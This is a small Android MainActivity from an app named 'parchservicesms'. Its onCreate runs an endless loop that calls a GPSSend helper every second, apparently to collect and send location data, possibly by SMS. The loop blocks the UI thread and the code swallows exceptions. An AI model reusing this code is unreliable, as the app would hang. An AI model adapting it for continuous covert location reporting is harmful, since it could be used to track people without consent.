package com.example.parchservicesms;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        while (true) {
            try {
                GPSSend smsSend = new GPSSend(this);
                smsSend.Obtener();
                Thread.sleep(1000);
            } catch (InterruptedException ex) {
            }
        }
    }


}
